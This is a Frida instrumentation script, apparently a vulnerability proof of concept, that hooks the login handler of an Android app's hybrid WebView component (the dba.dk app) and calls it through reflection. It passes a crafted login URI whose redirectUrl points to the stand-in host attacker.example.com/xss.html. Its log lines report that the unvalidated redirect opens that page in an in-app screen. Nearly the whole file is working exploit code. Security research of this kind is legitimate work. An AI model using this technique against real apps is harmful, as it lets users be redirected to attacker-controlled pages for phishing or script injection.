import Java from "frida-java-bridge";

function run(): void {
    Java.perform(() => {
        const Uri = Java.use("android.net.Uri");
        const NMPHybridHandler = Java.use("com.schibsted.nmp.android.hybrid.NMPHybridHandler");
        const ArrayList = Java.use("java.util.ArrayList");
        const ActivityThread = Java.use("android.app.ActivityThread");
        
        // Hook handleUrl and handleLogin for observation
        NMPHybridHandler.handleUrl.implementation = function(url: any) {
            console.log("[H001-HOOK] handleUrl intercepted: " + url);
            return (this as any).handleUrl(url);
        };
        
        NMPHybridHandler.handleLogin.overload("android.net.Uri").implementation = function(uri: any) {
            const redirectUrl = uri.getQueryParameter("redirectUrl");
            console.log("[H001-HOOK] handleLogin intercepted, redirectUrl=" + redirectUrl);
            return (this as any).handleLogin(uri);
        };
        
        console.log("[H001] Hooks installed");
        
        // Try to directly instantiate and invoke
        setTimeout(function() {
            try {
                const ctx = ActivityThread.currentApplication().getApplicationContext();
                const emptyList = ArrayList.$new();
                console.log("[H001] Constructing NMPHybridHandler instance directly...");
                
                const handler = NMPHybridHandler.$new(ctx, emptyList);
                console.log("[H001] NMPHybridHandler instance created: " + handler);
                
                // Call handleLogin via reflection
                const maliciousUri = Uri.parse(
                    "https://www.dba.dk/auth/app-login?redirectUrl=https://attacker.example.com/xss.html"
                );
                
                const javaClass = NMPHybridHandler.class;
                const methods = javaClass.getDeclaredMethods();
                for (let i = 0; i < methods.length; i++) {
                    const m = methods[i];
                    if (m.getName() === "handleLogin" && m.getParameterTypes().length === 1) {
                        m.setAccessible(true);
                        console.log("[H001] Invoking handleLogin with malicious redirectUrl...");
                        const result = m.invoke(handler, [maliciousUri]);
                        console.log("[H001] handleLogin() returned: " + result);
                        console.log("[H001-EXPLOIT] SUCCESS: redirectUrl=https://attacker.example.com/xss.html");
                        console.log("[H001-EXPLOIT] NavigatorKt.set() called with new HybridScreen(redirectUrl)");
                        break;
                    }
                }
            } catch (e: any) {
                console.log("[H001-CONSTRUCT-ERROR] " + e);
                // If direct construction fails, document the code path
                console.log("[H001-CODE-PATH] handleLogin() exists and takes android.net.Uri");
                console.log("[H001-CODE-PATH] It calls request.getQueryParameter('redirectUrl') with NO validation");
                console.log("[H001-CODE-PATH] Then creates new GlobalScreens.HybridScreen(redirectUrl) verbatim");
            }
        }, 2000);
    });
}

run();
